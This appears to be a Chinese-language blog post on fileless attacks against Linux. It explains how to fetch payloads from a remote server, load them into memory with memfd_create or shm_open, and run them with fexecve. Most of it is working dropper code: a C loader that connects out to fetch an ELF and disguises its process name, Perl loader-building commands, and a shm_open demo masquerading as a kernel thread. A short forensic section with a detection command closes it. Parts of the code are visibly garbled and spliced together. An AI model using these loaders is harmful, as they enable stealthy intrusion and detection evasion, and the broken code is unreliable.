# 0x00 无文件攻击(Linux)
持久控制、不落地种马、躲避检测。
## 1 整体思路
**step1**: 代码寄存。将核心代码放到远离目标的远端服务器上。
elf文件、命令、脚本语言代码。
**step2**: 加载代码到内存。
shm_open 创建共享内存文件，源于Linux进程间使用共享达到快速交换数据的思想。该文件存在于/dev/shm/或/tmpfs/目录下。
memfd_create 获取一个匿名文件并返回可供操作的文件描述符。该匿名文件存在于/proc/pid/fd/目录下。
基于shm_open的无文件攻击现在已经没人讨论了，隐身性较差。
**step3**: 调用运行。
libc提供了不少执行可执行文件的函数，这类函数常被称为execl函数族。fexecve是无文件攻击场景下最爱用的函数，给定一个文件描述符，它就能运行指向的文件。
### 1.1 公开进展
当前针对Linux的无文件攻击demo普遍要求目标设备上有一个已落地文件。这个落地文件是个加载器，用它加载真正需要运行的代码。
![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/image-20211202145901770.png)
#### 1.1.1 C码加载器
```c
//https://0x00sec.org/t/super-stealthy-droppers/3715
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#define __NR_memfd_create 319
#define MFD_CLOEXEC 1
static inline int memfd_create(const char *name, unsigned int flags) {
    return syscall(__NR_memfd_create, name, flags);
}
extern char        **environ;
int main (int argc, char **argv) {
  int                fd, s;
  unsigned long      addr = 0x0100007f11110002;
  char               *args[2]= {"[kworker/u!0]", NULL};
  char               buf[1024];
  // Connect
  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) > elfload.pl &='.$fd) or die "open: $!";
select((select($FH),$l=1)[0]);
# Load binary into anonymous file (i. e. into memory)
print "Writing ELF binary to memory...";
EOF
```
**第二部分**
```shell
perl -e '$/=\32;print"print \$FH pack q/H*/, q".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(<>)' elfdemo >> elfload.pl
```
**第三部分**
```shell
cat >> elfload.pl >>>> TASK_START
whoami > ./itworks
`cat ./task.sh`
### 
#include 
#include 
#include 
#include 
#include 
static char *args[] = {
    "[ipv6_addrconf]",
	"192.168.44.1",
	NULL
};
extern char **environ;
int main(void) 
{
    struct stat st;
    void *p;
    int fd, shm_fd, rc;
    shm_fd = shm_open("pping", O_RDWR | O_CREAT, 0777);
    if (shm_fd == -1) {
	perror("shm_open");
	exit(1);
    }
    rc = stat("/usr/bin/ping", &st);
    if (rc == -1) {
	perror("stat");
	exit(1);
    }
    rc = ftruncate(shm_fd, st.st_size);
    if (rc == -1) {
	perror("ftruncate");
	exit(1);
    }
    p = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED,
	     shm_fd, 0);
    if (p == MAP_FAILED) {
	perror("mmap");
	exit(1);
    }
    fd = open("/usr/bin/ping", O_RDONLY, 0);
    if (fd == -1) {
	perror("openls");
	exit(1);
    }
    //复制fd对应文件的内容到p空间中
    rc = read(fd, p, st.st_size);
    if (rc == -1) {
	perror("read");
	exit(1);
    }
    if (rc != st.st_size) {
	fputs("Strange situation!\n", stderr);
	exit(1);
    }
    munmap(p, st.st_size);
    close(shm_fd);
    //执行该命令，fexecve的用法是通过文件描述符运行文件
    shm_fd = shm_open("pping", O_RDONLY, 0);
    fexecve(shm_fd, args, environ);
    perror("fexecve");
    return 0;
}
```
### 6.2  ELF加载器（syscall memfd_create）
功能性demo参考1.1.1即可。
地址：https://www.github.com/aplyc1a/ELFMemoryLoader.git
![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/image-20211204194639514.png)
![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/image-20211204194657845.png)
![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/image-20211204194704757.png)
![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/image-20211204194746933.png)
## 7 取证分析
由于Linux下一切皆文件的思想，因此实际还是存在一定的线索能够帮助分析是否使用了这类无文件攻击技术的。
1.Linux上部署能够检测memfd_create 调用的HI(DP)S主机安全类设备。
2.历史记录文件。
3.定位调用了memfd或使用了共享内存的进程。
![](https://raw.githubusercontent.com/aplyc1a/blogs_picture/master/image-20211202172705582.png)
```shell
ls /proc/*/exe -al 2>/dev/null|grep "memfd\|/dev/shm"
```